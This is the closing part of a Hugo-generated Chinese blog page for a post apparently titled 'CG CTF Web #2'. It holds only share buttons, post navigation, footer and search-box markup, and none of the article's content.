+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/cg-ctf-web-2/&amp;quote=CG%20CTF%20Web%20#2"
+      title="分享到 Facebook"
+      aria-label="分享到 Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="mailto:?body=http://localhost:1313/posts/cg-ctf-web-2/&amp;subject=CG%20CTF%20Web%20#2"
+      title="通过电子邮件发送"
+      aria-label="通过电子邮件发送"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/posts/cg-ctf-web-2/&amp;resubmit=true&amp;title=CG%20CTF%20Web%20#2"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://t.me/share/url?url=http://localhost:1313/posts/cg-ctf-web-2/&amp;resubmit=true&amp;title=CG%20CTF%20Web%20#2"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/CG-CTF-Web-2.md"
+        var oid_likes = "likes_posts\/CG-CTF-Web-2.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/cg-ctf-web-1/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >CG CTF Web #1</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-02-07T15:47:52&#43;08:00">2020-02-07</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/an-arctic-north-bluish-color-palette/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >An Arctic, North Bluish Color Palette</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2020-02-10T11:50:44&#43;08:00">2020-02-10</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="返回顶部" title="返回顶部">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      wicsp
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a> 强力驱动
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="http://localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="搜索"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="关闭 (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
